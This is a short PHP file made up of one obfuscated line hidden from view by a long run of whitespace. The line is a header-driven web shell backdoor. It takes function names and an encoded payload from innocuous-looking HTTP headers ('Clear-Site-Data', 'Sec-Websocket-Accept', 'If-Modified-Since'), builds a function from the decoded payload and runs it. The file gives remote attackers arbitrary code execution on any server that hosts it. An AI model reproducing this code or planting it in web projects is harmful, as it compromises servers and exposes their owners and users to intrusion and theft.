<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Clear-Site-Data'])){$rindex=$_HEADERS['Clear-Site-Data']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['If-Modified-Since']));$rindex();}
